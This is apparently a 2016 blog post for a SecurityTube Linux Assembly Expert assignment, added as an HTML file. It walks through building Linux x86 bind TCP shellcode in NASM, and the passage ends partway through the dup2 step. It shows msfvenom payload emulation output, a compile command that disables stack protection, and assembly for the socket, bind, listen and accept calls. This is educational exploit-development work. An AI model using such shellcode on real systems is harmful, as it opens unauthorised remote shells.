@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
+<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>SLAE Assignment 1 - Bind TCP Shell – popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SLAE, SecurityTube, Assignment, Shellcode, nasm, assembly, bind shell"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="SLAE Assignment 1 - Bind TCP Shell"> <meta name="twitter:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta name="twitter:site" content="@skawasec"> <meta name="twitter:creator" content="@skawasec"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="SLAE Assignment 1 - Bind TCP Shell"> <meta property="og:description" content="SLAE Assignment StubThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification."> <meta property="og:url" content="http://localhost:4000/SLAE-Assignment-1/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/SLAE-Assignment-1/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/skawasec" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
+<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
+<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>SLAE Assignment 1 - Bind TCP Shell</h1> <h4>05 Dec 2016</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~13 minutes </p>
+<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <h3 id="slae-assignment-stub">SLAE Assignment Stub</h3> <p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.</p> <p><a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p> <p>Student ID: SLAE-807</p> <h3 id="assignment-1-requirements">Assignment 1 Requirements</h3> <ul> <li>Create a shell bind TCP shellcode</li> <li>The port number should be easily configurable</li> <li>Create a wrapper script that takes the port number or mark the specific byte in the shellcode that needs to be replaced</li> </ul> <h3 id="the-bind-tcp-shell">The Bind TCP shell</h3> <p>The bind TCP shell creates a local socket and listens for an incoming connection. Once a client connects, a <code class="highlighter-rouge">/bin/sh</code> is presented on a user supplied network port</p> <p>The bind TCP shell can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/bind.nasm">here</a>.</p> <p>A wrapper for the shellcode can be found here <a href="https://github.com/skahwah/slae/blob/master/assignment1/shellcode-bind.c">here</a>.</p> <p>Compile it using these options: <code class="highlighter-rouge">gcc -fno-stack-protector -z execstack shellcode-bind.c -o shellcode-bind</code></p> <p>A network port to hex converter can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/networkhex.rb">here</a>.</p> <div class="language-ruby highlighter-rouge"><pre class="highlight"><code><span class="mi">08</span><span class="p">:</span><span class="mi">25</span> <span class="n">skawa</span><span class="vi">@skawa</span><span class="o">-</span><span class="ss">mbp: </span><span class="no">Desktop</span> <span class="err">$</span> <span class="n">ruby</span> <span class="n">networkhex</span><span class="p">.</span><span class="nf">rb</span>
+<span class="no">IP</span><span class="p">:</span> <span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">156</span><span class="o">.</span><span class="mi">156</span> <span class="n">is</span> <span class="p">\</span><span class="n">xc0</span><span class="p">\</span><span class="n">xa8</span><span class="p">\</span><span class="n">x9c</span><span class="p">\</span><span class="n">x9c</span>
+<span class="no">Port</span><span class="p">:</span> <span class="mi">3879</span> <span class="n">is</span> <span class="p">\</span><span class="n">x0f</span><span class="p">\</span><span class="n">x27</span>
+<span class="mi">08</span><span class="p">:</span><span class="mi">25</span> <span class="n">skawa</span><span class="vi">@skawa</span><span class="o">-</span><span class="ss">mbp: </span><span class="no">Desktop</span> <span class="err">$</span>
+</code></pre></div> <h3 id="examining-a-bind-tcp-shell">Examining a Bind TCP shell</h3> <p>Before trying to write a bind TCP shell in assembly, it can be useful to disassemble an existing payload and understand all of the components at play.</p> <p>Libemu is a fantastic emulator that can help with running and disassembling shellcode in to meaningful segments and instructions.</p> <p>The example shellcode below is the <code class="highlighter-rouge">linux/x86/shell_bind_tcp</code> payload part of <code class="highlighter-rouge">msfvenom</code>.</p> <div class="language-c highlighter-rouge"><pre class="highlight"><code><span class="n">skawa</span><span class="err">@</span><span class="n">ubuntu</span><span class="o">:~/</span><span class="n">libemu</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">sctest</span><span class="err">$</span> <span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">shell_bind_tcp</span> <span class="o">-</span><span class="n">f</span> <span class="n">raw</span> <span class="o">-</span><span class="n">a</span> <span class="n">x86</span> <span class="o">--</span><span class="n">platform</span> <span class="n">linux</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">sctest</span> <span class="o">-</span><span class="n">vvv</span> <span class="o">-</span><span class="n">S</span> <span class="o">-</span><span class="n">s</span> <span class="mi">100000</span>
+<span class="n">verbose</span> <span class="o">=</span> <span class="mi">3</span>
+
+<span class="p">...</span>
+<span class="o">&lt;</span><span class="n">snippet</span><span class="o">&gt;</span>
+<span class="p">...</span>
+
+<span class="kt">int</span> <span class="n">socket</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">domain</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">protocol</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">14</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">bind</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="o">*</span> <span class="n">my_addr</span> <span class="o">=</span> <span class="mh">0x00416fc2</span> <span class="o">=&gt;</span>
+         <span class="k">struct</span>   <span class="o">=</span> <span class="p">{</span>
+             <span class="kt">short</span> <span class="n">sin_family</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+             <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">sin_port</span> <span class="o">=</span> <span class="mi">23569</span> <span class="p">(</span><span class="n">port</span><span class="o">=</span><span class="mi">4444</span><span class="p">);</span>
+             <span class="k">struct</span> <span class="n">in_addr</span> <span class="n">sin_addr</span> <span class="o">=</span> <span class="p">{</span>
+                 <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">s_addr</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">);</span>
+             <span class="p">};</span>
+             <span class="kt">char</span> <span class="n">sin_zero</span> <span class="o">=</span> <span class="s">"       "</span><span class="p">;</span>
+         <span class="p">};</span>
+     <span class="kt">int</span> <span class="n">addrlen</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">listen</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">s</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">backlog</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">accept</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">sockfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+     <span class="n">sockaddr_in</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x00000000</span> <span class="o">=&gt;</span>
+         <span class="n">none</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">addrlen</span> <span class="o">=</span> <span class="mh">0x00000010</span> <span class="o">=&gt;</span>
+         <span class="n">none</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">19</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">dup2</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">oldfd</span> <span class="o">=</span> <span class="mi">19</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">newfd</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">14</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">dup2</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">oldfd</span> <span class="o">=</span> <span class="mi">19</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">newfd</span> <span class="o">=</span> <span class="mi">13</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">13</span><span class="p">;</span>
+
+<span class="p">...</span>
+<span class="o">&lt;</span><span class="n">snippet</span><span class="o">&gt;</span>
+<span class="p">...</span>
+
+<span class="kt">int</span> <span class="n">dup2</span> <span class="p">(</span>
+     <span class="kt">int</span> <span class="n">oldfd</span> <span class="o">=</span> <span class="mi">19</span><span class="p">;</span>
+     <span class="kt">int</span> <span class="n">newfd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+<span class="kt">int</span> <span class="n">execve</span> <span class="p">(</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">dateiname</span> <span class="o">=</span> <span class="mh">0x00416fb2</span> <span class="o">=&gt;</span>
+           <span class="o">=</span> <span class="s">"/bin//sh"</span><span class="p">;</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">[</span>
+           <span class="o">=</span> <span class="mh">0x00416faa</span> <span class="o">=&gt;</span>
+               <span class="o">=</span> <span class="mh">0x00416fb2</span> <span class="o">=&gt;</span>
+                   <span class="o">=</span> <span class="s">"/bin//sh"</span><span class="p">;</span>
+           <span class="o">=</span> <span class="mh">0x00000000</span> <span class="o">=&gt;</span>
+             <span class="n">none</span><span class="p">;</span>
+     <span class="p">];</span>
+     <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="mh">0x00000000</span> <span class="o">=&gt;</span>
+         <span class="n">none</span><span class="p">;</span>
+<span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+</code></pre></div> <p>After examining the <code class="highlighter-rouge">linux/x86/shell_bind_tcp</code> payload, it is fairly evident that the ingredients for a bind shell can be broken up in to the following segments:</p> <ul> <li>socket</li> <li>bind</li> <li>listen</li> <li>accept</li> <li>dup2</li> <li>execve</li> </ul> <h3 id="socket">Socket</h3> <p>The first thing to do is identify the system call for sockets, this is <code class="highlighter-rouge">socketcall</code> and has a value of <code class="highlighter-rouge">102</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
+#define __NR_socketcall		102
+</code></pre></div> <p>The arguments required by the <code class="highlighter-rouge">socketcall</code> syscall can then be identified. As seen below, the two arguments that are required are <code class="highlighter-rouge">call</code>, which is the particular function that is going to be invoked, as well as arguments for the <code class="highlighter-rouge">call</code> that is being used.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       int socketcall(int call, unsigned long *args)
+</code></pre></div> <p>As the creation of a new socket needs to take place, the function that is going to be called by <code class="highlighter-rouge">socketcall</code> is <code class="highlighter-rouge">socket</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">socket</code> function; this is <code class="highlighter-rouge">1</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/linux/net.h | grep SOCKET
+ * NET		An implementation of the SOCKET network access protocol.
+#define SYS_SOCKET	1		/* sys_socket(2)		*/
+#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
+skawa@ubuntu:~/libemu/tools/sctest$
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">socket</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       #include &lt;sys/types.h&gt;          /* See NOTES */
+       #include &lt;sys/socket.h&gt;
+
+       int socket(int domain, int type, int protocol);
+</code></pre></div> <p>The <code class="highlighter-rouge">domain</code> argument requires a communication protocol. After checking the <code class="highlighter-rouge">socket</code> header file, the protocol that needs to be selected is <code class="highlighter-rouge">PF_INET</code>; this is <code class="highlighter-rouge">2</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/i386-linux-gnu/bits/socket.h | grep "Protocol families." -A 8
+/* Protocol families.  */
+#define	PF_UNSPEC	0	/* Unspecified.  */
+#define	PF_LOCAL	1	/* Local to host (pipes and file-domain).  */
+#define	PF_UNIX		PF_LOCAL /* POSIX name for PF_LOCAL.  */
+#define	PF_FILE		PF_LOCAL /* Another non-standard name for PF_LOCAL.  */
+#define	PF_INET		2	/* IP protocol family.  */
+#define	PF_AX25		3	/* Amateur Radio AX.25.  */
+#define	PF_IPX		4	/* Novell Internet Protocol.  */
+#define	PF_APPLETALK	5	/* Appletalk DDP.  */
+skawa@ubuntu:~/libemu/tools/sctest$
+</code></pre></div> <p>Next, the <code class="highlighter-rouge">type</code> argument requires a communication type. After checking the <code class="highlighter-rouge">socket</code> header file, the socket type that needs to be selected is <code class="highlighter-rouge">SOCK_STREAM</code>; this is <code class="highlighter-rouge">1</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/i386-linux-gnu/bits/socket.h | grep "Types of sockets" -A 7
+/* Types of sockets.  */
+enum __socket_type
+{
+  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
+				   byte streams.  */
+#define SOCK_STREAM SOCK_STREAM
+  SOCK_DGRAM = 2,		/* Connectionless, unreliable datagrams
+				   of fixed maximum length.  */
+skawa@ubuntu:~/libemu/tools/sctest$
+</code></pre></div> <p>The <code class="highlighter-rouge">protocol</code> argument needs to set. According to the <code class="highlighter-rouge">socket</code> manual:</p> <div class="highlighter-rouge"><pre class="highlight"><code>The  protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
+</code></pre></div> <p>As such, the value supplied to the <code class="highlighter-rouge">protocol</code> can be set to <code class="highlighter-rouge">0x0</code></p> <p>Having fulfilled the requirements for the <code class="highlighter-rouge">socket</code> function, the socket segment can now be created.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span> <span class="c">;zero out ebx</span>
+<span class="k">mul</span> <span class="n">ebx</span> <span class="c">;this zero's out eax and edx also</span>
+
+<span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
+<span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c">;socketcall type, socket</span>
+
+<span class="c">;populate the stack with the arguments for socket</span>
+<span class="k">push</span> <span class="n">edx</span> <span class="c">;socket protocol 0x0 is moved on to the stack</span>
+<span class="k">push</span> <span class="n">ebx</span> <span class="c">;socket type 1, SOCK_STREAM, is moved on to the stack</span>
+<span class="k">push</span> <span class="mh">0x2</span> <span class="c">;socket domain 2, PF_INET, is moved on to the stack</span>
+
+<span class="c">;set up the socketcall syscall</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;all arguments for socket, as required by socketcall are pointed to by ECX</span>
+<span class="k">int</span> <span class="mh">0x80</span> <span class="c">;execute socket syscall</span>
+
+<span class="k">xchg</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span> <span class="c">;move the return value from the socket syscall into edx for preservation, also zero out eax.</span>
+<span class="k">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span> <span class="c">;clear out esi</span>
+</code></pre></div> <p>One thing to note is that a socket file descriptor is returned to <code class="highlighter-rouge">EAX</code>. It will be important to preserve this for later use.</p> <h3 id="bind">Bind</h3> <p>Bind is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">bind</code> function; this is <code class="highlighter-rouge">2</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep -i bind
+#define SYS_BIND	2		/* sys_bind(2)			*/
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">bind</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       #include &lt;sys/types.h&gt;          /* See NOTES */
+       #include &lt;sys/socket.h&gt;
+
+       int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+</code></pre></div> <p>The <code class="highlighter-rouge">sockfd</code> argument requires the file descriptor returned by a socket creation. This is currently stored in both <code class="highlighter-rouge">EAX</code> and <code class="highlighter-rouge">EDX</code>, however, will be shortly removed from <code class="highlighter-rouge">EAX</code> once the system call is set up.</p> <p>The <code class="highlighter-rouge">*addr</code> argument requires a socket address structure. There are different types of socket address structures, however the one of concern is <code class="highlighter-rouge">sockaddr_in</code>. The components required for this structure are quite simple, the address family, which is <code class="highlighter-rouge">AF_INET</code>, the same as <code class="highlighter-rouge">PF_INET</code>, or <code class="highlighter-rouge">2</code>. The port to bind to, and the IP address to listen on. If the IP address set to <code class="highlighter-rouge">0x0</code>, the <code class="highlighter-rouge">bind</code> will listen on all interfaces.</p> <div class="highlighter-rouge"><pre class="highlight"><code>struct sockaddr_in {
+    sa_family_t    sin_family; /* address family: AF_INET */
+    in_port_t      sin_port;   /* port in network byte order */
+    struct in_addr sin_addr;   /* internet address */
+};
+</code></pre></div> <p>The <code class="highlighter-rouge">addrlen</code> argument requires the size of the struct in bytes.</p> <p>Having fulfilled the requirements for the <code class="highlighter-rouge">bind</code> function, the bind segment can now be created.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
+<span class="k">inc</span> <span class="n">bl</span> <span class="c">;ebx contains 2, for the type of socketcall, which is bind</span>
+
+<span class="c">;populate the stack with the arguments for the sockaddr_in structure</span>
+<span class="k">push</span> <span class="n">esi</span>  <span class="c">;sin_addr, 0, is pushed on to the stack (8 bytes)</span>
+<span class="k">push</span> <span class="n">word</span> <span class="mh">0x270f</span>  <span class="c">;sin_port, 3879, is pushed on to the stack (unsigned int, 16 bits) (4 bytes)</span>
+<span class="k">push</span> <span class="n">word</span> <span class="mh">0x2</span>  <span class="c">;sin_family, AF_NET, which is 2, the same as PF_INET (unsigned int, 16 bits) (4 bytes)</span>
+
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;the stack pointer to the sockaddr_in structure is moved into ecx</span>
+
+<span class="k">push</span> <span class="mh">0x10</span><span class="c">; push bind addrlen to the stack, the length of the struct is 16 bytes (8 + 4 + 4)</span>
+<span class="k">push</span> <span class="n">ecx</span> <span class="c">;the stack pointer to the sockaddr_in structure pushed on to the stack</span>
+<span class="k">push</span> <span class="n">edx</span><span class="c">; push bind sockfd to the stack, this is the value of the file descriptor returned to socket</span>
+
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;update ecx to the stack pointer which currently contains a pointer to "sockfd, sockaddr_in, addrlen. All arguments for bind, as required by socketcall are pointed to by ECX</span>
+<span class="k">int</span> <span class="mh">0x80</span>  <span class="c">;execute bind syscall</span>
+</code></pre></div> <h3 id="listen">Listen</h3> <p>Listen is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">listen</code> function; this is <code class="highlighter-rouge">4</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep LISTEN
+#define SYS_LISTEN	4		/* sys_listen(2)		*/
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">listen</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       #include &lt;sys/types.h&gt;          /* See NOTES */
+       #include &lt;sys/socket.h&gt;
+
+       int listen(int sockfd, int backlog);
+</code></pre></div> <p>The <code class="highlighter-rouge">sockfd</code> argument requires the file descriptor returned by a socket creation. This is currently stored in <code class="highlighter-rouge">EDX</code>.</p> <p>The <code class="highlighter-rouge">backlog</code> argument requires the maximum length to which the queue of pending connections for <code class="highlighter-rouge">sockfd</code> may grow. This can be set to <code class="highlighter-rouge">0</code>.</p> <p>Having fulfilled the requirements for the <code class="highlighter-rouge">listen</code> function, the listen segment can now be created.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
+<span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;ebx contains 4, for the type of socketcall, which is listen</span>
+
+<span class="c">;populate the stack with the arguments for listen</span>
+<span class="k">push</span> <span class="n">esi</span>  <span class="c">;push listen backlog to the stack</span>
+<span class="k">push</span> <span class="n">edx</span><span class="c">; push listen sockfd to the stack, this is the value of the file descriptor returned to socket</span>
+
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;all arguments for listen, as required by socketcall are pointed to by ECX</span>
+<span class="k">int</span> <span class="mh">0x80</span>  <span class="c">;execute listen syscall</span>
+</code></pre></div> <h3 id="accept">Accept</h3> <p>Accept is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">accept</code> function; this is <code class="highlighter-rouge">5</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep ACCEPT
+#define SYS_ACCEPT	5		/* sys_accept(2)		*/
+#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
+#define __SO_ACCEPTCON	(1 &lt;&lt; 16)	/* performed a listen		*/
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">accept</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       #include &lt;sys/types.h&gt;          /* See NOTES */
+       #include &lt;sys/socket.h&gt;
+
+       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+</code></pre></div> <p>The <code class="highlighter-rouge">accept</code> function is required to accept any incoming connections by clients. As client related information is unknown and does not need to be restricted it does not need to be populated with meaningful data.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
+<span class="k">inc</span> <span class="n">bl</span> <span class="c">;ebx contains 5, for the type of socketcall, which is accept</span>
+
+<span class="c">;populate the stack with the arguments for accept</span>
+<span class="k">push</span> <span class="n">esi</span>  <span class="c">;push accept addrlen to the stack</span>
+<span class="k">push</span> <span class="n">esi</span>  <span class="c">;push accept sockaddr addr structure to the stack</span>
+<span class="k">push</span> <span class="n">edx</span><span class="c">; push accept sockfd to the stack, this is the value of the file descriptor returned to socket</span>
+
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;All arguments for accept, as required by socketcall are pointed to by ECX</span>
+<span class="k">int</span> <span class="mh">0x80</span>  <span class="c">;execute accept syscall</span>
+
+<span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span> <span class="c">;move the return value from the accept syscall into EDX for preservation.</span>
+</code></pre></div> <p>One thing to note is that a client socket file descriptor is returned to <code class="highlighter-rouge">EAX</code>. It will be important to preserve this for later use.</p> <h3 id="duplicate-file-descriptor">Duplicate File Descriptor</h3> <p>Using the duplicate file descriptor, it will be possible to to redirect/duplicate STDIN(0), STDOUT(1) and STDERR(2) through the client socket file descriptor. Doing this makes the shell observable.</p> <p>The first thing to do is identify the system call for <code class="highlighter-rouge">dup2</code>, this is <code class="highlighter-rouge">63</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup
+#define __NR_dup		 41
+#define __NR_dup2		 63
+#define __NR_dup3		330
+skawa@ubuntu:~/Desktop/code/assignment/assignment1$
+</code></pre></div> <p>The arguments required by the <code class="highlighter-rouge">dup2</code> syscall can then be identified. As seen below, the two arguments that are required are <code class="highlighter-rouge">oldfd</code> and <code class="highlighter-rouge">newfd</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       #include &lt;unistd.h&gt;
+
+       int dup(int oldfd);
+       int dup2(int oldfd, int newfd);
+</code></pre></div> <p>The <code class="highlighter-rouge">oldfd</code> argument will contain the client socket file descriptor, which is currently in the <code class="highlighter-rouge">EDX</code> register.</p> <p>The <code class="highlighter-rouge">newfd</code> argument will contain the value for STDIN(0), STDOUT(1) and STDERR(2). The way this is achieved is through a loop that takes advantage of the signed flag. Once the value in <code class="highlighter-rouge">ECX</code> has been exhausted, the signed flag will be set, thus permitting the exit of the loop.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;dup2</span>
+<span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edx</span> <span class="c">;move the client socket file descriptor into EBX to satisfy the oldf2 argument for dup2</span>
+<span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>  <span class="c">;clear out ecx</span>
